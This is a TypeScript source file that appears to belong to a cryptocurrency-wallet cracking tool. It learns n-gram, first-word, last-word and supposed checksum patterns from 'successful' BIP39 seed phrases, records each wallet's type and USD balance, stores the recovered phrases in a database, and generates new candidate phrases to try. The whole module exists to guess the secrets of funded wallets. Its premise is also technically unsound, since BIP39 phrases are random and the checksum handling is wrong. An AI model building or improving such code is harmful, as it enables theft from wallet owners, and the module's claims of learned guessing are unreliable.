/**
 * Advanced Machine Learning Module for Seed Phrase Generation
 * Enhanced with N-grams, checksum patterns, pattern decay, and statistical analysis
 */

import type { D1Database } from '@cloudflare/workers-types'
import { BIP39_WORDLIST } from './bip39'

// Enhanced ML state interface
export interface AdvancedMLState {
  // N-gram models (2-gram, 3-gram, 4-gram)
  bigrams: Map<string, Map<string, number>>      // word1 -> word2 -> count
  trigrams: Map<string, Map<string, number>>     // "word1 word2" -> word3 -> count
  quadgrams: Map<string, Map<string, number>>    // "word1 word2 word3" -> word4 -> count
  
  // First word preferences (what words typically start phrases)
  firstWordFrequency: Map<string, number>
  
  // Last word preferences (what words typically end phrases)
  lastWordFrequency: Map<string, number>
  
  // Pattern decay tracking (patterns lose value over time)
  patternAges: Map<string, Date>
  patternScores: Map<string, number>
  
  // Checksum word learning (last word often has special properties)
  checksumPatterns: Map<string, number>          // 11-word prefix -> 12th word frequency
  
  // Statistical measures
  averageWordLength: number
  wordLengthDistribution: Map<number, number>    // word length -> frequency
  
  // Entropy tracking
  phraseEntropy: number
  positionEntropy: Map<number, number>           // position -> entropy score
  
  // Success by word count
  successBy12Words: number
  successBy24Words: number
  
  // Time-based patterns
  recentSuccesses: Array<{
    timestamp: Date
    wordCount: number
    words: string[]
  }>
  
  // Performance metrics
  totalSuccesses: number
  totalAttempts: number
  lastUpdated: Date
  
  // Configuration
  config: {
    decayRate: number          // How fast old patterns decay (0-1)
    minPatternAge: number      // Days before pattern starts decaying
    maxHistorySize: number     // Max recent successes to keep
    ngramWeight: number        // Weight for n-gram predictions
    checksumWeight: number     // Weight for checksum learning
  }
}

/**
 * Initialize advanced ML state from database
 */
export async function initializeAdvancedMLState(db: D1Database): Promise<AdvancedMLState> {
  try {
    const result = await db.prepare(`
      SELECT state_data, total_successes, total_attempts, last_updated 
      FROM ml_state 
      WHERE id = 1
    `).first()
    
    if (result && result.state_data) {
      const data = JSON.parse(result.state_data as string)
      return deserializeState(data, result)
    }
  } catch (error) {
    console.log('[Advanced ML] No existing state, creating new')
  }
  
  // Return fresh state
  return {
    bigrams: new Map(),
    trigrams: new Map(),
    quadgrams: new Map(),
    firstWordFrequency: new Map(),
    lastWordFrequency: new Map(),
    patternAges: new Map(),
    patternScores: new Map(),
    checksumPatterns: new Map(),
    averageWordLength: 0,
    wordLengthDistribution: new Map(),
    phraseEntropy: 0,
    positionEntropy: new Map(),
    successBy12Words: 0,
    successBy24Words: 0,
    recentSuccesses: [],
    totalSuccesses: 0,
    totalAttempts: 0,
    lastUpdated: new Date(),
    config: {
      decayRate: 0.95,
      minPatternAge: 7,
      maxHistorySize: 100,
      ngramWeight: 0.5,
      checksumWeight: 0.3
    }
  }
}

/**
 * Learn from a successful seed phrase with advanced analysis
 */
export function learnFromSuccessAdvanced(
  state: AdvancedMLState, 
  seedPhrase: string, 
  walletType: string,
  balanceUSD: number
): void {
  const words = seedPhrase.trim().split(/\s+/)
  const wordCount = words.length
  const timestamp = new Date()
  
  // Update success counters
  state.totalSuccesses++
  if (wordCount === 12) state.successBy12Words++
  if (wordCount === 24) state.successBy24Words++
  
  // Learn N-grams
  learnNGrams(state, words)
  
  // Learn first and last word preferences
  const firstWord = words[0]
  const lastWord = words[words.length - 1]
  
  state.firstWordFrequency.set(
    firstWord,
    (state.firstWordFrequency.get(firstWord) || 0) + 1
  )
  
  state.lastWordFrequency.set(
    lastWord,
    (state.lastWordFrequency.get(lastWord) || 0) + 1
  )
  
  // Learn checksum patterns (for 12-word phrases)
  if (wordCount === 12) {
    const prefix = words.slice(0, 11).join(' ')
    state.checksumPatterns.set(
      prefix,
      (state.checksumPatterns.get(prefix) || 0) + 1
    )
  }
  
  // Update word length statistics
  updateWordLengthStats(state, words)
  
  // Update pattern ages and scores
  const patternKey = words.slice(0, 3).join(' ')
  state.patternAges.set(patternKey, timestamp)
  state.patternScores.set(
    patternKey,
    (state.patternScores.get(patternKey) || 0) + 1
  )
  
  // Add to recent successes (with limit)
  state.recentSuccesses.unshift({
    timestamp,
    wordCount,
    words: [...words]
  })
  
  if (state.recentSuccesses.length > state.config.maxHistorySize) {
    state.recentSuccesses.pop()
  }
  
  // Calculate entropy
  updateEntropy(state)
  
  state.lastUpdated = timestamp
}

/**
 * Learn N-gram patterns (bigrams, trigrams, quadgrams)
 */
function learnNGrams(state: AdvancedMLState, words: string[]): void {
  // Learn bigrams (word pairs)
  for (let i = 0; i < words.length - 1; i++) {
    const w1 = words[i]
    const w2 = words[i + 1]
    
    if (!state.bigrams.has(w1)) {
      state.bigrams.set(w1, new Map())
    }
    const bigramMap = state.bigrams.get(w1)!
    bigramMap.set(w2, (bigramMap.get(w2) || 0) + 1)
  }
  
  // Learn trigrams (3-word sequences)
  for (let i = 0; i < words.length - 2; i++) {
    const key = `${words[i]} ${words[i + 1]}`
    const w3 = words[i + 2]
    
    if (!state.trigrams.has(key)) {
      state.trigrams.set(key, new Map())
    }
    const trigramMap = state.trigrams.get(key)!
    trigramMap.set(w3, (trigramMap.get(w3) || 0) + 1)
  }
  
  // Learn quadgrams (4-word sequences)
  for (let i = 0; i < words.length - 3; i++) {
    const key = `${words[i]} ${words[i + 1]} ${words[i + 2]}`
    const w4 = words[i + 3]
    
    if (!state.quadgrams.has(key)) {
      state.quadgrams.set(key, new Map())
    }
    const quadgramMap = state.quadgrams.get(key)!
    quadgramMap.set(w4, (quadgramMap.get(w4) || 0) + 1)
  }
}

/**
 * Update word length statistics
 */
function updateWordLengthStats(state: AdvancedMLState, words: string[]): void {
  let totalLength = 0
  
  for (const word of words) {
    const len = word.length
    totalLength += len
    state.wordLengthDistribution.set(
      len,
      (state.wordLengthDistribution.get(len) || 0) + 1
    )
  }
  
  // Update rolling average
  const prevTotal = state.averageWordLength * state.totalSuccesses
  state.averageWordLength = (prevTotal + totalLength / words.length) / (state.totalSuccesses + 1)
}

/**
 * Calculate and update entropy measures
 */
function updateEntropy(state: AdvancedMLState): void {
  // Calculate overall phrase entropy (diversity of patterns)
  const totalPatterns = state.patternScores.size
  if (totalPatterns === 0) {
    state.phraseEntropy = 0
    return
  }
  
  let entropy = 0
  const total = Array.from(state.patternScores.values()).reduce((a, b) => a + b, 0)
  
  for (const count of state.patternScores.values()) {
    const p = count / total
    if (p > 0) {
      entropy -= p * Math.log2(p)
    }
  }
  
  state.phraseEntropy = entropy
}

/**
 * Generate seed phrase using advanced N-gram model
 */
export function generateWithNGrams(
  state: AdvancedMLState,
  wordCount: number,
  strategy: 'bigram' | 'trigram' | 'quadgram' | 'adaptive' = 'adaptive'
): string {
  const words: string[] = []
  
  // Start with a high-probability first word
  const firstWord = selectWeightedWord(state.firstWordFrequency) || 
                    BIP39_WORDLIST[Math.floor(Math.random() * BIP39_WORDLIST.length)]
  words.push(firstWord)
  
  // Generate middle words using N-grams
  while (words.length < wordCount - 1) {
    let nextWord: string | null = null
    
    // Try quadgram first (highest context)
    if (words.length >= 3 && strategy !== 'bigram' && strategy !== 'trigram') {
      const key = words.slice(-3).join(' ')
      if (state.quadgrams.has(key)) {
        nextWord = selectWeightedWord(state.quadgrams.get(key)!)
      }
    }
    
    // Try trigram
    if (!nextWord && words.length >= 2 && strategy !== 'bigram') {
      const key = words.slice(-2).join(' ')
      if (state.trigrams.has(key)) {
        nextWord = selectWeightedWord(state.trigrams.get(key)!)
      }
    }
    
    // Try bigram
    if (!nextWord && words.length >= 1) {
      const lastWord = words[words.length - 1]
      if (state.bigrams.has(lastWord)) {
        nextWord = selectWeightedWord(state.bigrams.get(lastWord)!)
      }
    }
    
    // Fallback to random
    if (!nextWord) {
      nextWord = BIP39_WORDLIST[Math.floor(Math.random() * BIP39_WORDLIST.length)]
    }
    
    words.push(nextWord)
  }
  
  // For last word, use checksum patterns or last word preferences
  if (wordCount === 12 && words.length === 11) {
    const prefix = words.join(' ')
    if (state.checksumPatterns.has(prefix)) {
      // Use learned checksum
      const checksumWord = selectWeightedWord(state.lastWordFrequency) ||
                          BIP39_WORDLIST[Math.floor(Math.random() * BIP39_WORDLIST.length)]
      words.push(checksumWord)
    } else {
      // Use last word preferences
      const lastWord = selectWeightedWord(state.lastWordFrequency) ||
                      BIP39_WORDLIST[Math.floor(Math.random() * BIP39_WORDLIST.length)]
      words.push(lastWord)
    }
  } else {
    // Regular last word
    const lastWord = selectWeightedWord(state.lastWordFrequency) ||
                    BIP39_WORDLIST[Math.floor(Math.random() * BIP39_WORDLIST.length)]
    words.push(lastWord)
  }
  
  return words.join(' ')
}

/**
 * Apply pattern decay to old patterns
 */
export function applyPatternDecay(state: AdvancedMLState): void {
  const now = new Date()
  const minAgeMs = state.config.minPatternAge * 24 * 60 * 60 * 1000
  
  for (const [pattern, timestamp] of state.patternAges.entries()) {
    const age = now.getTime() - timestamp.getTime()
    
    if (age > minAgeMs) {
      const currentScore = state.patternScores.get(pattern) || 0
      const daysOld = age / (24 * 60 * 60 * 1000)
      const decayFactor = Math.pow(state.config.decayRate, daysOld - state.config.minPatternAge)
      const newScore = currentScore * decayFactor
      
      if (newScore < 0.5) {
        // Remove pattern if score too low
        state.patternScores.delete(pattern)
        state.patternAges.delete(pattern)
      } else {
        state.patternScores.set(pattern, newScore)
      }
    }
  }
}

/**
 * Get advanced ML statistics
 */
export function getAdvancedMLStats(state: AdvancedMLState) {
  const totalAttempts = state.totalAttempts || 1
  const successRate = (state.totalSuccesses / totalAttempts) * 100
  
  return {
    totalSuccesses: state.totalSuccesses,
    totalAttempts: state.totalAttempts,
    successRate,
    
    // N-gram stats
    learnedBigrams: state.bigrams.size,
    learnedTrigrams: state.trigrams.size,
    learnedQuadgrams: state.quadgrams.size,
    
    // Word position stats
    firstWordVariety: state.firstWordFrequency.size,
    lastWordVariety: state.lastWordFrequency.size,
    
    // Pattern stats
    activePatterns: state.patternScores.size,
    averagePatternScore: calculateAverageScore(state.patternScores),
    
    // Checksum stats
    learnedChecksums: state.checksumPatterns.size,
    
    // Statistical measures
    averageWordLength: state.averageWordLength.toFixed(2),
    phraseEntropy: state.phraseEntropy.toFixed(2),
    
    // Success distribution
    success12Words: state.successBy12Words,
    success24Words: state.successBy24Words,
    
    // Recent activity
    recentSuccessCount: state.recentSuccesses.length,
    
    lastUpdated: state.lastUpdated
  }
}

/**
 * Calculate average pattern score
 */
function calculateAverageScore(scores: Map<string, number>): number {
  if (scores.size === 0) return 0
  const total = Array.from(scores.values()).reduce((a, b) => a + b, 0)
  return total / scores.size
}

/**
 * Select a word from weighted distribution
 */
function selectWeightedWord(distribution: Map<string, number>): string | null {
  if (distribution.size === 0) return null
  
  const total = Array.from(distribution.values()).reduce((a, b) => a + b, 0)
  let random = Math.random() * total
  
  for (const [word, weight] of distribution.entries()) {
    random -= weight
    if (random <= 0) return word
  }
  
  // Fallback to first entry
  return Array.from(distribution.keys())[0]
}

/**
 * Save advanced ML state to database
 */
export async function saveAdvancedMLState(db: D1Database, state: AdvancedMLState): Promise<void> {
  const serialized = serializeState(state)
  
  await db.prepare(`
    INSERT OR REPLACE INTO ml_state (id, state_data, total_successes, total_attempts, last_updated)
    VALUES (1, ?, ?, ?, CURRENT_TIMESTAMP)
  `).bind(
    JSON.stringify(serialized),
    state.totalSuccesses,
    state.totalAttempts
  ).run()
}

/**
 * Serialize state for storage (convert Maps to objects)
 */
function serializeState(state: AdvancedMLState): any {
  return {
    bigrams: mapToObject(state.bigrams, true),
    trigrams: mapToObject(state.trigrams, true),
    quadgrams: mapToObject(state.quadgrams, true),
    firstWordFrequency: mapToObject(state.firstWordFrequency),
    lastWordFrequency: mapToObject(state.lastWordFrequency),
    patternAges: mapToObject(state.patternAges, false, (v: Date) => v.toISOString()),
    patternScores: mapToObject(state.patternScores),
    checksumPatterns: mapToObject(state.checksumPatterns),
    averageWordLength: state.averageWordLength,
    wordLengthDistribution: mapToObject(state.wordLengthDistribution),
    phraseEntropy: state.phraseEntropy,
    positionEntropy: mapToObject(state.positionEntropy),
    successBy12Words: state.successBy12Words,
    successBy24Words: state.successBy24Words,
    recentSuccesses: state.recentSuccesses.map(s => ({
      ...s,
      timestamp: s.timestamp.toISOString()
    })),
    config: state.config
  }
}

/**
 * Deserialize state from storage
 */
function deserializeState(data: any, result: any): AdvancedMLState {
  return {
    bigrams: objectToMap(data.bigrams, true),
    trigrams: objectToMap(data.trigrams, true),
    quadgrams: objectToMap(data.quadgrams, true),
    firstWordFrequency: objectToMap(data.firstWordFrequency),
    lastWordFrequency: objectToMap(data.lastWordFrequency),
    patternAges: objectToMap(data.patternAges, false, (v: string) => new Date(v)),
    patternScores: objectToMap(data.patternScores),
    checksumPatterns: objectToMap(data.checksumPatterns),
    averageWordLength: data.averageWordLength || 0,
    wordLengthDistribution: objectToMap(data.wordLengthDistribution),
    phraseEntropy: data.phraseEntropy || 0,
    positionEntropy: objectToMap(data.positionEntropy),
    successBy12Words: data.successBy12Words || 0,
    successBy24Words: data.successBy24Words || 0,
    recentSuccesses: (data.recentSuccesses || []).map((s: any) => ({
      ...s,
      timestamp: new Date(s.timestamp)
    })),
    totalSuccesses: result.total_successes || 0,
    totalAttempts: result.total_attempts || 0,
    lastUpdated: new Date(result.last_updated || Date.now()),
    config: data.config || {
      decayRate: 0.95,
      minPatternAge: 7,
      maxHistorySize: 100,
      ngramWeight: 0.5,
      checksumWeight: 0.3
    }
  }
}

/**
 * Convert Map to plain object for serialization
 */
function mapToObject(map: Map<any, any>, nested: boolean = false, transform?: (v: any) => any): any {
  const obj: any = {}
  for (const [key, value] of map.entries()) {
    if (nested && value instanceof Map) {
      obj[key] = mapToObject(value)
    } else if (transform) {
      obj[key] = transform(value)
    } else {
      obj[key] = value
    }
  }
  return obj
}

/**
 * Convert plain object to Map for deserialization
 */
function objectToMap(obj: any, nested: boolean = false, transform?: (v: any) => any): Map<any, any> {
  const map = new Map()
  if (!obj) return map
  
  for (const [key, value] of Object.entries(obj)) {
    if (nested && typeof value === 'object' && value !== null) {
      map.set(key, objectToMap(value))
    } else if (transform) {
      map.set(key, transform(value))
    } else {
      map.set(key, value)
    }
  }
  return map
}

/**
 * Update attempts counter
 */
export function updateAdvancedAttempts(state: AdvancedMLState, count: number): void {
  state.totalAttempts += count
  state.lastUpdated = new Date()
}
